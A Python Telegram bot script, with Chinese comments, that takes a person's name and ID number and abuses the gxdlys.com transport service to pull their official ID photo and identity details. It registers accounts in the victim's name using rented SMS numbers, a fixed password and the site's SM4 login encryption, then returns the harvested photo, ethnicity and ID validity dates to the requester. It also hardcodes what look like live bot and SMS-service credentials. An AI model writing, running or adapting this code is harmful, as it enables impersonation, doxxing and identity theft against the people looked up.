import asyncio,io,re,time,json,urllib.parse,base64,os,requests
from typing import Optional
from PIL import Image
from telegram import Update
from telegram.ext import Application,CommandHandler,MessageHandler,filters,ContextTypes,ConversationHandler

# ==================== 配置 ====================
BOT_TOKEN="5849383582:AAHIfKvl2O3buRgiIq4rwtC4b95KsP3BfS4"
PASSWORD="268428."
SMS_USERNAME="8c44166a5730186802cb1c949446e892df74413c11e12fecbceb74f3c16be27c"
SMS_PASSWORD="8c44166a5730186875a697beb684bf7c8cfd51f49c8bf11d5921060810d0571c"
SMS_PROJECT_ID="99593"
BASE_URL="http://www.gxdlys.com"
SMS_API_URL="http://api.haozhuma.com"

# ==================== SM4 加密 ====================
SM4_KEY="CatsPK0WWWRRhjkw"
SboxTable=[0xd6,0x90,0xe9,0xfe,0xcc,0xe1,0x3d,0xb7,0x16,0xb6,0x14,0xc2,0x28,0xfb,0x2c,0x05,0x2b,0x67,0x9a,0x76,0x2a,0xbe,0x04,0xc3,0xaa,0x44,0x13,0x26,0x49,0x86,0x06,0x99,0x9c,0x42,0x50,0xf4,0x91,0xef,0x98,0x7a,0x33,0x54,0x0b,0x43,0xed,0xcf,0xac,0x62,0xe4,0xb3,0x1c,0xa9,0xc9,0x08,0xe8,0x95,0x80,0xdf,0x94,0xfa,0x75,0x8f,0x3f,0xa6,0x47,0x07,0xa7,0xfc,0xf3,0x73,0x17,0xba,0x83,0x59,0x3c,0x19,0xe6,0x85,0x4f,0xa8,0x68,0x6b,0x81,0xb2,0x71,0x64,0xda,0x8b,0xf8,0xeb,0x0f,0x4b,0x70,0x56,0x9d,0x35,0x1e,0x24,0x0e,0x5e,0x63,0x58,0xd1,0xa2,0x25,0x22,0x7c,0x3b,0x01,0x21,0x78,0x87,0xd4,0x00,0x46,0x57,0x9f,0xd3,0x27,0x52,0x4c,0x36,0x02,0xe7,0xa0,0xc4,0xc8,0x9e,0xea,0xbf,0x8a,0xd2,0x40,0xc7,0x38,0xb5,0xa3,0xf7,0xf2,0xce,0xf9,0x61,0x15,0xa1,0xe0,0xae,0x5d,0xa4,0x9b,0x34,0x1a,0x55,0xad,0x93,0x32,0x30,0xf5,0x8c,0xb1,0xe3,0x1d,0xf6,0xe2,0x2e,0x82,0x66,0xca,0x60,0xc0,0x29,0x23,0xab,0x0d,0x53,0x4e,0x6f,0xd5,0xdb,0x37,0x45,0xde,0xfd,0x8e,0x2f,0x03,0xff,0x6a,0x72,0x6d,0x6c,0x5b,0x51,0x8d,0x1b,0xaf,0x92,0xbb,0xdd,0xbc,0x7f,0x11,0xd9,0x5c,0x41,0x1f,0x10,0x5a,0xd8,0x0a,0xc1,0x31,0x88,0xa5,0xcd,0x7b,0xbd,0x2d,0x74,0xd0,0x12,0xb8,0xe5,0xb4,0xb0,0x89,0x69,0x97,0x4a,0x0c,0x96,0x77,0x7e,0x65,0xb9,0xf1,0x09,0xc5,0x6e,0xc6,0x84,0x18,0xf0,0x7d,0xec,0x3a,0xdc,0x4d,0x20,0x79,0xee,0x5f,0x3e,0xd7,0xcb,0x39,0x48]
FK=[0xa3b1bac6,0x56aa3350,0x677d9197,0xb27022dc]
CK=[0x00070e15,0x1c232a31,0x383f464d,0x545b6269,0x70777e85,0x8c939aa1,0xa8afb6bd,0xc4cbd2d9,0xe0e7eef5,0xfc030a11,0x181f262d,0x343b4249,0x50575e65,0x6c737a81,0x888f969d,0xa4abb2b9,0xc0c7ced5,0xdce3eaf1,0xf8ff060d,0x141b2229,0x30373e45,0x4c535a61,0x686f767d,0x848b9299,0xa0a7aeb5,0xbcc3cad1,0xd8dfe6ed,0xf4fb0209,0x10171e25,0x2c333a41,0x484f565d,0x646b7279]
def rotl(x,n): left=(x<<n)&0xffffffff; signed_x=x-0x100000000 if (x&0x80000000) else x; right=(signed_x>>(32-n))&0xffffffff; return left|right
def sm4_sbox(a): return (SboxTable[(a>>24)&0xFF]<<24)|(SboxTable[(a>>16)&0xFF]<<16)|(SboxTable[(a>>8)&0xFF]<<8)|SboxTable[a&0xFF]
def sm4_lt(ka): bb=sm4_sbox(ka); return bb^rotl(bb,2)^rotl(bb,10)^rotl(bb,18)^rotl(bb,24)
def sm4_calci_rk(ka): bb=sm4_sbox(ka); return bb^rotl(bb,13)^rotl(bb,23)
def sm4_f(x0,x1,x2,x3,rk): return x0^sm4_lt(x1^x2^x3^rk)
def pkcs7_pad(data,block_size=16): pad_len=block_size-(len(data)%block_size); return data+bytes([pad_len])*pad_len
def sm4_encrypt_ecb(plain_text):
    data=plain_text.encode('utf-8'); padded=pkcs7_pad(data,16); key_bytes=SM4_KEY.encode('utf-8'); mk=[0]*4
    for i in range(4): mk[i]=(key_bytes[i*4]<<24)|(key_bytes[i*4+1]<<16)|(key_bytes[i*4+2]<<8)|key_bytes[i*4+3]
    k=[0]*36
    for i in range(4): k[i]=mk[i]^FK[i]
    sk=[0]*32
    for i in range(32): k[i+4]=k[i]^sm4_calci_rk(k[i+1]^k[i+2]^k[i+3]^CK[i]); sk[i]=k[i+4]
    result=bytearray()
    for offset in range(0,len(padded),16):
        block=padded[offset:offset+16]; x=[0]*36
        for i in range(4): x[i]=(block[i*4]<<24)|(block[i*4+1]<<16)|(block[i*4+2]<<8)|block[i*4+3]
        for i in range(32): x[i+4]=sm4_f(x[i],x[i+1],x[i+2],x[i+3],sk[i])
        out=bytearray(16)
        for i in range(4):
            val=x[35-i]; out[i*4]=(val>>24)&0xFF; out[i*4+1]=(val>>16)&0xFF; out[i*4+2]=(val>>8)&0xFF; out[i*4+3]=val&0xFF
        result.extend(out)
    return base64.b64encode(result).decode('utf-8')

session=requests.Session()
HEADERS={"User-Agent":"Mozilla/5.0 (Linux; Android 14; Build/BP2A.250605.031.A3) AppleWebKit/537.36","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","Referer":"http://www.gxdlys.com/Wechat/User/Regist"}

# ==================== 接码平台 ====================
def sms_login():
    try:
        r=requests.get(f"{SMS_API_URL}/sms/",params={'api':'login','user':SMS_USERNAME,'pass':SMS_PASSWORD},timeout=30)
        res=r.json()
        if str(res.get('code'))=='0': return res.get("token")
    except: pass
    return None

def get_phone(token):
    try:
        r=requests.get(f"{SMS_API_URL}/sms/",params={'api':'getPhone','token':token,'sid':SMS_PROJECT_ID},timeout=30)
        res=r.json()
        if str(res.get('code'))=='0': return res.get("phone")
    except: pass
    return None

def get_sms(token,phone):
    for _ in range(15):
        try:
            r=requests.get(f"{SMS_API_URL}/sms/",params={'api':'getMessage','token':token,'sid':SMS_PROJECT_ID,'phone':phone},timeout=30)
            res=r.json()
            if str(res.get('code'))=='0' and res.get("yzm"): return res.get("yzm")
        except: pass
        time.sleep(5)
    return None

# ==================== 获取验证码（直接返回图片数据）====================
def get_captcha():
    for _ in range(3):
        try:
            r=session.get(f"{BASE_URL}/Wechat/FaceDetect/GetVerifyCode",headers=HEADERS,timeout=10)
            if r.status_code!=200: continue
            data=r.json()
            if data.get("statusCode")!=200: continue
            img_b64=data.get("data",{}).get("img")
            uuid=data.get("data",{}).get("uuid")
            if not img_b64 or not uuid: continue
            # 解码图片数据
            img_data = base64.b64decode(img_b64)
            return img_data, uuid  # 直接返回字节数据
        except Exception as e:
            print(f"获取验证码出错: {e}")
        time.sleep(1)
    return None, None

# ==================== 发送短信 ====================
def send_sms(phone,captcha,uuid):
    data={"phoneId":phone,"type":"10001","IsEncryptPhoneId":"false","verifyCode":captcha,"uuid":uuid}
    try:
        r=session.post(f"{BASE_URL}/System/SmsService/PostVerifyCode",data=data,headers=HEADERS,timeout=60)
        return r.status_code==200 and r.json().get("statusCode")==200
    except: return False

# ==================== 注册 ====================
def register(phone,sms_code,captcha_code,real_name,id_card):
    data={"zipArea":"","userType":"-1","wechatUid":"","realName":real_name,"iDCard":id_card,"loginName":id_card,"password":PASSWORD,"idcardImg1Url":"218,8a785f252c8518","idcardImg2Url":"216,8a7860c46589f3","idcardImg3Url":"214,8a78664776227f","idcardImg4Url":"","ownerId":"","tel":phone,"isTelEncrypted":"false","validCode":sms_code,"verifyCode":captcha_code}
    try:
        r=session.post(f"{BASE_URL}/Wechat/User/RegistAdd",data=data,headers=HEADERS,timeout=60)
        return r.status_code==200 and r.json().get("statusCode")==200
    except: return False

# ==================== 登录 ====================
def login(id_card):
    enc_login=urllib.parse.quote(sm4_encrypt_ecb(id_card)); enc_pwd=urllib.parse.quote(sm4_encrypt_ecb(PASSWORD))
    data=f"loginName={enc_login}&password={enc_pwd}&wechatUid="
    headers=HEADERS.copy()
    headers["Referer"]="http://www.gxdlys.com/Wechat/Home/Login"
    headers["Host"]="www.gxdlys.com"
    try:
        r=session.post("http://www.gxdlys.com/Wechat/Home/PostLogin",headers=headers,data=data,timeout=60)
        if r.status_code==200:
            res=r.json()
            if res.get("statusCode")==200: return True,None
            else: return False,res.get("info","")
    except: pass
    return False,"异常"

def query_id_photo(name,id_card):
    try:
        encoded_name=urllib.parse.quote(name)
        url=f"{BASE_URL}/Wechat/FaceDetect/GetGAIDCardPhotoNew?idCard={id_card}&name={encoded_name}"
        headers=HEADERS.copy()
        headers["Referer"]="http://www.gxdlys.com/Wechat/EcertCert/ECertApply?OperateType=0&BnsAcceptId=&ObjectId=&BasicBnsId=46011&Params=%E7%BB%8F%E8%90%A5%E6%80%A7%E9%81%93%E8%B7%AF%E8%B4%A7%E7%89%A9%E8%BF%90%E8%BE%93%E9%A9%BE%E9%A9%B6%E5%91%98&Step=1"
        headers["Host"]="www.gxdlys.com"
        r=session.get(url,headers=headers,timeout=60)
        if r.status_code==200: return r.json()
    except: pass
    return None

def download_photo(file_id):
    try:
        r=session.get(f"{BASE_URL}/System/FileService/ShowFile?fileId={file_id}",timeout=60)
        if r.status_code==200 and 'image' in r.headers.get('Content-Type',''): return r.content
    except: pass
    return None

# ==================== 核心流程（手动输入）====================
async def process_and_reply(update, context, real_name, id_card):
    try:
        # 1. 尝试登录
        ok, msg = login(id_card)
        if ok:
            result = query_id_photo(real_name, id_card)
            if result and result.get("statusCode")==200:
                data=result.get("data",{})
                item2=data.get("item2",{})
                info=f"姓名：{item2.get('xm','')}\n身份证：{item2.get('gmsfhm','')}\n民族：{item2.get('mz','')}\n有效期：{item2.get('uL_FROM_DATE','')} 至 {item2.get('uL_END_DATE','')}"
                photo_bytes=download_photo(data.get("item1")) if data.get("item1") else None
                await context.bot.send_message(chat_id=update.effective_chat.id, text=f"✅ 成功！\n{info}")
                if photo_bytes:
                    await context.bot.send_photo(chat_id=update.effective_chat.id, photo=io.BytesIO(photo_bytes))
                return
            else:
                await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ 查询失败")
                return

        # 2. 未注册，走注册流程
        if "未注册" in msg or "不存在" in msg:
            # 接码登录
            token = sms_login()
            if not token:
                await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ 接码平台登录失败")
                return
            phone = get_phone(token)
            if not phone:
                await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ 获取手机号失败")
                return

            # 获取验证码图片
            img_data, uuid = get_captcha()
            if uuid is None:
                await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ 获取验证码失败")
                return

            # 发送图片并要求手动输入
            await context.bot.send_message(chat_id=update.effective_chat.id, text="📷 请查看下方验证码图片，输入字母数字组合（不区分大小写）")
            try:
                # 直接发送图片数据，无需保存文件
                await context.bot.send_photo(
                    chat_id=update.effective_chat.id,
                    photo=io.BytesIO(img_data),
                    caption="输入验证码（回复此消息）"
                )
            except Exception as e:
                await context.bot.send_message(chat_id=update.effective_chat.id, text=f"⚠️ 发送图片失败: {e}")
                return

            # 等待用户回复
            def check(msg):
                return msg.text and msg.chat.id == update.effective_chat.id
            try:
                user_msg = await context.bot.wait_for(
                    "message",
                    check=check,
                    timeout=60
                )
                captcha = user_msg.text.strip().upper()
            except asyncio.TimeoutError:
                await context.bot.send_message(chat_id=update.effective_chat.id, text="⏰ 输入超时，请重新 /query")
                return

            if not captcha:
                await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ 未获取到验证码")
                return

            # 发送短信
            if not send_sms(phone, captcha, uuid):
                await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ 短信发送失败")
                return
            await context.bot.send_message(chat_id=update.effective_chat.id, text="📨 短信已发送，正在自动获取验证码...")

            # 获取短信验证码
            sms_code = get_sms(token, phone)
            if not sms_code:
                await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ 短信验证码获取失败")
                return

            # 注册
            if not register(phone, sms_code, captcha, real_name, id_card):
                await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ 注册失败")
                return

            # 注册后登录查询
            ok2,_ = login(id_card)
            if ok2:
                result = query_id_photo(real_name, id_card)
                if result and result.get("statusCode")==200:
                    data=result.get("data",{})
                    item2=data.get("item2",{})
                    info=f"姓名：{item2.get('xm','')}\n身份证：{item2.get('gmsfhm','')}\n民族：{item2.get('mz','')}\n有效期：{item2.get('uL_FROM_DATE','')} 至 {item2.get('uL_END_DATE','')}"
                    photo_bytes=download_photo(data.get("item1")) if data.get("item1") else None
                    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"✅ 注册成功！\n{info}")
                    if photo_bytes:
                        await context.bot.send_photo(chat_id=update.effective_chat.id, photo=io.BytesIO(photo_bytes))
                else:
                    await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ 注册后查询失败")
            else:
                await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ 注册后登录失败")
        else:
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"❌ {msg}")
    except Exception as e:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"⚠️ 异常：{e}")
    finally:
        context.user_data.clear()

# ==================== Telegram 对话 ====================
WAITING_NAME, WAITING_IDCARD = range(2)

async def start(update,context):
    await update.message.reply_text("👋 发送 /query 开始查询")

async def query(update,context):
    await update.message.reply_text("请输入姓名：")
    return WAITING_NAME

async def receive_name(update,context):
    context.user_data['real_name']=update.message.text.strip()
    await update.message.reply_text("请输入身份证号码：")
    return WAITING_IDCARD

async def receive_idcard(update,context):
    real_name=context.user_data.get('real_name')
    id_card=update.message.text.strip()
    if not real_name:
        await update.message.reply_text("请先输入姓名")
        return ConversationHandler.END
    await update.message.reply_text("⏳ 查询中，约 1~2 分钟...")
    asyncio.create_task(process_and_reply(update, context, real_name, id_card))
    return ConversationHandler.END

def main():
    app=Application.builder().token(BOT_TOKEN).build()
    conv=ConversationHandler(entry_points=[CommandHandler('query',query)],
        states={WAITING_NAME:[MessageHandler(filters.TEXT & ~filters.COMMAND, receive_name)],
                WAITING_IDCARD:[MessageHandler(filters.TEXT & ~filters.COMMAND, receive_idcard)]},
        fallbacks=[CommandHandler('start',start)])
    app.add_handler(conv)
    app.add_handler(CommandHandler('start',start))
    app.run_polling()

if __name__=='__main__':
    main()
